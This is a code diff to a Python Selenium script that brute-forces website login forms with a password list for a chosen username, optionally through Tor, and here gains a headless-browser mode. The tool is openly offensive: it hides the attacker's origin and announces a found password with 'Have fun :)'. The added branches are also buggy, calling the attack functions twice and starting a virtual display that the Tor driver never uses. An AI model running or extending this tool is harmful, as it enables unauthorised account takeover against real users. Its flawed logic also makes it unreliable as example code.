@@ -33,12 +33,13 @@ parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button s
 parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
 parser.add_option("--website", dest="website",help="choose a website")
 parser.add_option("--tor", dest="tor", action="store_true", help="To conduct the attack through Tor")
+parser.add_option("--headless", dest="headless", action="store_true", help="Attack using a headless browser")
 (options, args) = parser.parse_args()
 
 
 
 
-def wizard(use_tor=False):
+def wizard(use_tor=False, headless=False):
     print (banner)
     website = input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
     print(color.GREEN + '[!] '+color.CWHITE + 'Checking if site exists ', flush=True),
@@ -65,18 +66,28 @@ def wizard(use_tor=False):
     username = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
     passlist = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
     if use_tor:
-        brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website, use_tor=True)
+        if headless:
+            brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website, use_tor=True, headless=True)
+        brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website, use_tor=True) 
     else:
+        if headless:
+            brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website, headless=True)
         brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website)
 
-def brutes(username, username_selector, password_selector, login_btn_selector, passlist, website, use_tor=False):
+def brutes(username, username_selector, password_selector, login_btn_selector, passlist, website, use_tor=False, headless=False):
     f = open(passlist, 'r')
     if use_tor:
-        browser = TorBrowserDriver(tbb_path)
+        if headless:
+            xvfb_display = start_xvfb()
+            browser = TorBrowserDriver(tbb_path)
+        else:
+            browser = TorBrowserDriver(tbb_path)
     else:
         optionss = webdriver.ChromeOptions()
         optionss.add_argument("--disable-popup-blocking")
         optionss.add_argument("--disable-extensions")
+        if headless:
+            optionss.add_argument("headless")
         browser = webdriver.Chrome(chrome_options=optionss)
     while True:
         try:
@@ -91,13 +102,18 @@ def brutes(username, username_selector, password_selector, login_btn_selector, p
                 print('------------------------')
                 print(color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
                 print('------------------------')
+                # What happens when we're all out of passwords???
         except KeyboardInterrupt: #returns to main menu if ctrl C is used
+            if use_tor and headless:
+              stop_xvfb(xvfb_display)
             exit()
         except selenium.common.exceptions.NoSuchElementException:
             print('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
             print('LAST PASS ATTEMPT BELLOW')
             print(color.GREEN + 'Password has been found: {0}'.format(line))
             print(color.YELLOW + 'Have fun :)')
+            if use_tor and headless:
+              stop_xvfb(xvfb_display)
             exit()
 
 username = options.username
@@ -114,15 +130,23 @@ if not (username and \
         website and \
         passlist):
     if options.tor:
+        if options.headless:
+            wizard(use_tor=True, headless=True)
         wizard(use_tor=True)
     else:
+        if options.headless:
+            wizard(headless=True)
         wizard()
 
 
 print(banner)
 if options.tor:
-    brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website, use_tor=True)
+    if options.headless:
+        brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website, use_tor=True, headless=True)
+    brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website, use_tor=True) 
 else:
+    if options.headless:
+        brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website, headless=True)
     brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website)
 
 
